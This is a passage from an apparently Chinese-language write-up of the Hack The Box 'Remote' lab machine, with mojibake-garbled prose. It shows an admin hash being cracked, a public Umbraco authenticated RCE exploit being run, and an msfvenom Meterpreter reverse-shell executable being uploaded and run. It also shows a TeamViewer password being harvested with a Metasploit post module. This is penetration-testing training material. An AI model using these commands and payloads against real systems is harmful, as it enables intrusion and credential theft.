class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate</span><br><span class="line">root@JIYE:~/htb/remote/site_backups/App_Data<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>å…¶ä¸­é‡è¦ä¿¡æ¯ä¸ºadminç”¨æˆ·ä¸ºadmin@htb.localï¼Œå¹¶ä¸”hashå€¼ä¸ºå¦‚ä¸‹</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">admin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;<span class="string">&quot;hashAlgorithm&quot;</span>:<span class="string">&quot;SHA1&quot;</span>&#125;</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br></pre></td></tr></table></figure>

<p><code>è§£ç æ•£åˆ—hashå€¼</code><span class="exturl" data-url="aHR0cHM6Ly9jcmFja3N0YXRpb24ubmV0Lw==">URL<i class="fa fa-external-link-alt"></i></span></p>
<img src="/2020/08/31/HTB-remote/image-20200831194146064.png" class>

<p><code>ä¿å­˜ç”¨æˆ·ä¸å¯†ç </code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/remote<span class="comment"># cat user.txt </span></span><br><span class="line">user:admin@htb.local</span><br><span class="line"><span class="built_in">hash</span>:b8be16afba8c314ad33d812f22a04991b90e2aaa</span><br><span class="line">crack:baconandcheese</span><br><span class="line">root@JIYE:~/htb/remote<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x05-æŸ¥æ‰¾umbraco-exploit"><a href="#0x05-æŸ¥æ‰¾umbraco-exploit" class="headerlink" title="0x05.æŸ¥æ‰¾umbraco exploit"></a>0x05.æŸ¥æ‰¾umbraco exploit</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25vcmFqL1VtYnJhY28tUkNF">exp URL<i class="fa fa-external-link-alt"></i></span></p>
<img src="/2020/08/31/HTB-remote/image-20200831200103525.png" class>

<h2 id="0x06-åˆ©ç”¨"><a href="#0x06-åˆ©ç”¨" class="headerlink" title="0x06.åˆ©ç”¨"></a>0x06.åˆ©ç”¨</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/remote<span class="comment"># git clone https://github.com/noraj/Umbraco-RCE.git</span></span><br><span class="line">root@JIYE:~/htb/remote<span class="comment"># ls</span></span><br><span class="line">nmap.CV  site_backups  Umbraco-RCE  user.txt</span><br><span class="line">root@JIYE:~/htb/remote<span class="comment"># cd Umbraco-RCE/</span></span><br><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment"># ls</span></span><br><span class="line">exploit.py  LICENSE  README.md  requirements.txt</span><br><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹å‚æ•°</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage</span><br><span class="line">$ python exploit.py -h</span><br><span class="line">usage: exploit.py [-h] -u USER -p PASS -i URL -c CMD [-a ARGS]</span><br><span class="line"></span><br><span class="line">Umbraco authenticated RCE</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>                 show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -u USER, --user USER       username / email</span><br><span class="line">  -p PASS, --password PASS   password</span><br><span class="line">  -i URL, --host URL         root URL</span><br><span class="line">  -c CMD, --<span class="built_in">command</span> CMD      <span class="built_in">command</span></span><br><span class="line">  -a ARGS, --arguments ARGS  arguments</span><br><span class="line">Examples:</span><br><span class="line"></span><br><span class="line">$ python exploit.py -u admin@example.org -p password123 -i <span class="string">&#x27;http://10.0.0.1&#x27;</span> -c ipconfig</span><br><span class="line">$ python exploit.py -u admin@example.org -p password123 -i <span class="string">&#x27;http://10.0.0.1&#x27;</span> -c powershell.exe -a <span class="string">&#x27;-NoProfile -Com</span></span><br></pre></td></tr></table></figure>

<p><code>exp</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment"># python3 exploit.py -u admin@htb.local -p baconandcheese -i &#x27;http://10.10.10.180&#x27; -c powershell.exe -a &#x27;ls C:/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                               </span><br><span class="line">----                -------------         ------ ----                               </span><br><span class="line">d-----        2/20/2020   1:13 AM                ftp_transfer </span><br><span class="line">d-----        2/19/2020   3:11 PM                inetpub                             </span><br><span class="line">d-----        2/19/2020  11:09 PM                Microsoft                           </span><br><span class="line">d-----        9/15/2018   3:19 AM                PerfLogs                           </span><br><span class="line">d-r---        2/23/2020   2:19 PM                Program Files                       </span><br><span class="line">d-----        2/23/2020   2:19 PM                Program Files (x86)                 </span><br><span class="line">d-----        8/31/2020   4:27 AM                site_backups</span><br><span class="line">d-r---        2/19/2020   3:12 PM                Users                              </span><br><span class="line">d-----        2/20/2020  12:52 AM                Windows                             </span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹ç½‘ç«™æ ¹ç›®å½•ï¼Œå…³æ³¨Mediaï¼Œåé¢æœ‰ç”¨</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment"># python3 exploit.py -u admin@htb.local -p baconandcheese -i &#x27;http://10.10.10.180&#x27; -c powershell.exe -a &#x27;ls C:/inetpub&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\inetpub</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----                               </span><br><span class="line">d-----        2/19/2020   3:11 PM                custerr</span><br><span class="line">d-----        2/19/2020   3:11 PM                ftproot</span><br><span class="line">d-----        2/20/2020   1:33 AM                <span class="built_in">history</span>                            </span><br><span class="line">d-----        2/19/2020   4:36 PM                logs</span><br><span class="line">d-----        2/19/2020   3:11 PM                temp</span><br><span class="line">d-----        2/20/2020  12:16 PM                wwwroot                                                               </span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment"># python3 exploit.py -u admin@htb.local -p baconandcheese -i &#x27;http://10.10.10.180&#x27; -c powershell.exe -a &#x27;ls C:/inetpub/wwwroot&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\inetpub\wwwroot</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                               </span><br><span class="line">----                -------------         ------ ----                               </span><br><span class="line">d-----        2/19/2020   6:02 PM                App_Browsers</span><br><span class="line">d-----        2/20/2020   1:59 AM                App_Data                           </span><br><span class="line">d-----        2/19/2020  10:29 PM                App_Plugins                         </span><br><span class="line">d-----        2/19/2020   3:12 PM                aspnet_client                       </span><br><span class="line">d-----        2/19/2020  11:30 PM                bin                                 </span><br><span class="line">d-----        2/19/2020   6:02 PM                Config                             </span><br><span class="line">d-----        2/19/2020  10:29 PM                css                                 </span><br><span class="line">d-----        8/31/2020   7:57 AM                Media                               </span><br><span class="line">d-----        2/19/2020  10:29 PM                scripts                             </span><br><span class="line">d-----        2/19/2020   6:02 PM                Umbraco                             </span><br><span class="line">d-----        2/19/2020   6:02 PM                Umbraco_Client                     </span><br><span class="line">d-----        2/19/2020  10:29 PM                Views</span><br><span class="line">-a----        11/1/2018   1:06 PM            152 default.aspx                       </span><br><span class="line">-a----        11/1/2018   1:06 PM             89 Global.asax                         </span><br><span class="line">-a----        2/20/2020  12:57 AM          28539 Web.config                                                            </span><br><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x07-ç™»å…¥web-application"><a href="#0x07-ç™»å…¥web-application" class="headerlink" title="0x07.ç™»å…¥web application"></a>0x07.ç™»å…¥web application</h2><p><code>å‘ç°Mediaæ¨¡å—å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼ŒåŒæ—¶è¿˜å‘äº†æŸä½&quot;å‰è¾ˆ&quot;ä¸Šä¼ çš„exeæ‰§è¡Œç¨‹åºğŸ˜‚</code></p>
<img src="/2020/08/31/HTB-remote/image-20200831203504989.png" class>

<p><code>msfç”Ÿæˆexeä¸Šä¼ </code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/remote<span class="comment"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.216 LPORT=6666 -f exe -o demo.exe</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 341 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">Saved as: demo.exe</span><br><span class="line">root@JIYE:~/htb/remote<span class="comment"># ls</span></span><br><span class="line">demo.exe  nmap.CV  site_backups  Umbraco-RCE  user.txt</span><br><span class="line">root@JIYE:~/htb/remote<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>ä¸Šä¼ demo.exeï¼Œç„¶è€Œåœ¨è¿™é‡Œæ˜¯æ²¡æœ‰ä¸Šä¼ åˆ°Mediaç›®å½•ä¸‹çš„</code></p>
<img src="/2020/08/31/HTB-remote/image-20200831204758326.png" class>

<p><code>å†æ¬¡ä¸Šä¼ </code></p>
<img src="/2020/08/31/HTB-remote/image-20200831205321509.png" class>

<img src="/2020/08/31/HTB-remote/image-20200831205359285.png" class>

<p><code>è¾“å…¥ä¸€ä¸ªåå­—ï¼Œå¹¶ç‚¹å‡»ä¿å­˜</code></p>
<img src="/2020/08/31/HTB-remote/image-20200831223611754.png" class>

<p><code>è¿™é‡Œä¸Šä¼ æˆåŠŸ</code></p>
<img src="/2020/08/31/HTB-remote/image-20200831223730143.png" class>

<p><code>å‘½ä»¤è¡Œä¸‹å†æ¬¡æŸ¥çœ‹ï¼Œç»“æœæ˜¯å­˜åœ¨çš„ï¼Œä¸Šä¼ æˆåŠŸ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment"># python3 exploit.py -u admin@htb.local -p baconandcheese -i &#x27;http://10.10.10.180&#x27; -c powershell.exe -a &#x27;ls C:/inetpub/wwwroot/Media/1033&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\inetpub\wwwroot\Media\1036</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                  </span><br><span class="line">----                -------------         ------ ----                                                                  </span><br><span class="line">-a----        8/31/2020   8:57 AM          73802 demo.exe                                                              </span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x08-åå¼¹shell"><a href="#0x08-åå¼¹shell" class="headerlink" title="0x08.åå¼¹shell"></a>0x08.åå¼¹shell</h2><p><code>msfç›‘å¬</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 10.10.17.216</span><br><span class="line">lhost =&gt; 10.10.17.216</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 6666</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf5 exploit(multi/handler) &gt;</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:6666 </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>æ‰§è¡Œdemo.exe</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment"># python3 exploit.py -u admin@htb.local -p baconandcheese -i &#x27;http://10.10.10.180&#x27; -c powershell.exe -a &#x27;C:/inetpub/wwwroot/Media/1033/demo.exe&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>å¾—åˆ°shell</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:6666 </span><br><span class="line">[*] Sending stage (176195 bytes) to 10.10.10.180</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.17.216:6666 -&gt; 10.10.10.180:49688) at 2020-08-31 10:41:25 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; whoami</span><br><span class="line">[-] Unknown <span class="built_in">command</span>: whoami.</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: IIS APPPOOL\DefaultAppPool</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<p><code>å¯»æ‰¾user.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3180 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\windows\system32\inetsrv&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">iis apppool\defaultapppool</span><br><span class="line"></span><br><span class="line">C:\windows\system32\inetsrv&gt;<span class="built_in">cd</span>\</span><br><span class="line"><span class="built_in">cd</span>\</span><br><span class="line"></span><br><span class="line">C:\&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE23-EB3E</span><br><span class="line"></span><br><span class="line"> Directory of C:\</span><br><span class="line"></span><br><span class="line">02/20/2020  02:13 AM    &lt;DIR&gt;          ftp_transfer</span><br><span class="line">02/19/2020  04:11 PM    &lt;DIR&gt;          inetpub</span><br><span class="line">02/20/2020  12:09 AM    &lt;DIR&gt;          Microsoft</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          PerfLogs</span><br><span class="line">02/23/2020  03:19 PM    &lt;DIR&gt;          Program Files</span><br><span class="line">02/23/2020  03:19 PM    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">08/31/2020  09:32 AM    &lt;DIR&gt;          site_backups</span><br><span class="line">02/19/2020  04:12 PM    &lt;DIR&gt;          Users</span><br><span class="line">02/20/2020  01:52 AM    &lt;DIR&gt;          Windows</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               9 Dir(s)  19,406,811,136 bytes free</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">cd</span> Users    </span><br><span class="line"><span class="built_in">cd</span> Users</span><br><span class="line"></span><br><span class="line">C:\Users&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE23-EB3E</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users</span><br><span class="line"></span><br><span class="line">02/19/2020  04:12 PM    &lt;DIR&gt;          .</span><br><span class="line">02/19/2020  04:12 PM    &lt;DIR&gt;          ..</span><br><span class="line">02/19/2020  04:12 PM    &lt;DIR&gt;          .NET v2.0</span><br><span class="line">02/19/2020  04:12 PM    &lt;DIR&gt;          .NET v2.0 Classic</span><br><span class="line">02/19/2020  04:12 PM    &lt;DIR&gt;          .NET v4.5</span><br><span class="line">02/19/2020  04:12 PM    &lt;DIR&gt;          .NET v4.5 Classic</span><br><span class="line">08/31/2020  10:33 AM    &lt;DIR&gt;          Administrator</span><br><span class="line">02/19/2020  04:12 PM    &lt;DIR&gt;          Classic .NET AppPool</span><br><span class="line">02/20/2020  03:42 AM    &lt;DIR&gt;          Public</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               9 Dir(s)  19,406,811,136 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users&gt;<span class="built_in">cd</span> Public</span><br><span class="line"><span class="built_in">cd</span> Public</span><br><span class="line"></span><br><span class="line">C:\Users\Public&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE23-EB3E</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Public</span><br><span class="line"></span><br><span class="line">02/20/2020  03:42 AM    &lt;DIR&gt;          .</span><br><span class="line">02/20/2020  03:42 AM    &lt;DIR&gt;          ..</span><br><span class="line">02/19/2020  04:03 PM    &lt;DIR&gt;          Documents</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Downloads</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Music</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Pictures</span><br><span class="line">08/31/2020  10:33 AM                34 user.txt</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Videos</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               7 Dir(s)  19,406,798,848 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Public&gt;<span class="built_in">type</span> user.txt</span><br><span class="line"><span class="built_in">type</span> user.txt</span><br><span class="line">****************************</span><br><span class="line"></span><br><span class="line">C:\Users\Public&gt;</span><br></pre></td></tr></table></figure>

<h2 id="0x09-ææƒ"><a href="#0x09-ææƒ" class="headerlink" title="0x09.ææƒ"></a>0x09.ææƒ</h2><p><code>æŸ¥çœ‹è½¯ä»¶ç›®å½•ï¼Œå‘ç°å®‰è£…äº†teamviewer</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\&gt;<span class="built_in">cd</span> program files</span><br><span class="line"><span class="built_in">cd</span> program files</span><br><span class="line"></span><br><span class="line">C:\Program Files&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE23-EB3E</span><br><span class="line"></span><br><span class="line"> Directory of C:\Program Files</span><br><span class="line"></span><br><span class="line">02/23/2020  03:19 PM    &lt;DIR&gt;          .</span><br><span class="line">02/23/2020  03:19 PM    &lt;DIR&gt;          ..</span><br><span class="line">02/19/2020  04:04 PM    &lt;DIR&gt;          Common Files</span><br><span class="line">09/15/2018  05:06 AM    &lt;DIR&gt;          internet explorer</span><br><span class="line">02/23/2020  03:16 PM    &lt;DIR&gt;          Microsoft SQL Server</span><br><span class="line">02/19/2020  04:11 PM    &lt;DIR&gt;          MSBuild</span><br><span class="line">02/19/2020  04:11 PM    &lt;DIR&gt;          Reference Assemblies</span><br><span class="line">02/19/2020  04:04 PM    &lt;DIR&gt;          VMware</span><br><span class="line">02/20/2020  07:46 AM    &lt;DIR&gt;          Windows Defender</span><br><span class="line">09/15/2018  05:05 AM    &lt;DIR&gt;          Windows Defender Advanced Threat Protection</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Mail</span><br><span class="line">10/29/2018  06:39 PM    &lt;DIR&gt;          Windows Media Player</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Multimedia Platform</span><br><span class="line">09/15/2018  03:28 AM    &lt;DIR&gt;          windows nt</span><br><span class="line">10/29/2018  06:39 PM    &lt;DIR&gt;          Windows Photo Viewer</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Portable Devices</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Security</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          WindowsPowerShell</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">              18 Dir(s)  19,407,548,416 bytes free</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">cd</span> program files (x86)</span><br><span class="line"><span class="built_in">cd</span> program files (x86)</span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE23-EB3E</span><br><span class="line"></span><br><span class="line"> Directory of C:\Program Files (x86)</span><br><span class="line"></span><br><span class="line">02/23/2020  03:19 PM    &lt;DIR&gt;          .</span><br><span class="line">02/23/2020  03:19 PM    &lt;DIR&gt;          ..</span><br><span class="line">09/15/2018  03:28 AM    &lt;DIR&gt;          Common Files</span><br><span class="line">09/15/2018  05:06 AM    &lt;DIR&gt;          Internet Explorer</span><br><span class="line">02/23/2020  03:19 PM    &lt;DIR&gt;          Microsoft SQL Server</span><br><span class="line">02/23/2020  03:15 PM    &lt;DIR&gt;          Microsoft.NET</span><br><span class="line">02/19/2020  04:11 PM    &lt;DIR&gt;          MSBuild</span><br><span class="line">02/19/2020  04:11 PM    &lt;DIR&gt;          Reference Assemblies</span><br><span class="line">02/20/2020  03:14 AM    &lt;DIR&gt;          TeamViewer</span><br><span class="line">09/15/2018  05:05 AM    &lt;DIR&gt;          Windows Defender</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Mail</span><br><span class="line">10/29/2018  06:39 PM    &lt;DIR&gt;          Windows Media Player</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Multimedia Platform</span><br><span class="line">09/15/2018  03:28 AM    &lt;DIR&gt;          windows nt</span><br><span class="line">10/29/2018  06:39 PM    &lt;DIR&gt;          Windows Photo Viewer</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Portable Devices</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          WindowsPowerShell</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">              17 Dir(s)  19,407,241,216 bytes free</span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)&gt;</span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹teamviewerç‰ˆæœ¬ï¼Œç»“æœä¸ºv7</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Program Files (x86)&gt;<span class="built_in">cd</span> teamviewer</span><br><span class="line"><span class="built_in">cd</span> teamviewer</span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\TeamViewer&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE23-EB3E</span><br><span class="line"></span><br><span class="line"> Directory of C:\Program Files (x86)\TeamViewer</span><br><span class="line"></span><br><span class="line">02/20/2020  03:14 AM    &lt;DIR&gt;          .</span><br><span class="line">02/20/2020  03:14 AM    &lt;DIR&gt;          ..</span><br><span class="line">02/27/2020  11:35 AM    &lt;DIR&gt;          Version7</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               3 Dir(s)  19,405,176,832 bytes free</span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\TeamViewer&gt;</span><br></pre></td></tr></table></figure>

<p><code>msfç ´è§£teamviewerå¯†ç ï¼Œå¯†ç ä¸º!R3m0te!</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/credentials/teamviewer_passwords</span><br><span class="line"></span><br><span class="line">[*] Finding TeamViewer Passwords on REMOTE</span><br><span class="line">[+] Found Unattended Password: !R3m0te!</span><br><span class="line">[+] Passwords stored <span class="keyword">in</span>: /root/.msf4/loot/20200831110133_default_10.10.10.180_host.teamviewer__720435.txt</span><br><span class="line">[*] &lt;---------------- | Using Window Technique | ----------------&gt;</span><br><span class="line">[*] TeamViewer<span class="string">&#x27;s language setting options are &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">[*] TeamViewer&#x27;</span>s version is <span class="string">&#x27;&#x27;</span></span><br><span class="line">[-] Unable to find TeamViewer<span class="string">&#x27;s process</span></span><br><span class="line"><span class="string">meterpreter &gt;</span></span><br></pre></td></tr></table></figure>

<p><code>ä½¿ç”¨evil-winrmææƒ</code><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0hhY2twbGF5ZXJzL2V2aWwtd2lucm0=">expåœ°å€<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/remote<span class="comment"># proxychains gem install winrm winrm-fs stringio</span></span><br><span class="line">root@JIYE:~/htb/remote<span class="comment"># git clone https://github.com/Hackplayers/evil-winrm.git</span></span><br><span class="line">æ­£å…‹éš†åˆ° <span class="string">&#x27;evil-winrm&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 22, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (22/22), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (16/16), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 805 (delta 9), reused 17 (delta 6), pack-reused 783</span><br><span class="line">æ¥æ”¶å¯¹è±¡ä¸­: 100% (805/805), 1.96 MiB | 1.35 MiB/s, å®Œæˆ.</span><br><span class="line">å¤„ç† delta ä¸­: 100% (461/461), å®Œæˆ.</span><br><span class="line">root@JIYE:~/htb/remote<span class="comment"># ls</span></span><br><span class="line">demo.exe  evil-winrm  flag  nmap.CV  site_backups  Umbraco-RCE  user.txt</span><br><span class="line">root@JIYE:~/htb/remote<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹ç›¸å…³å‚æ•°</code></p>
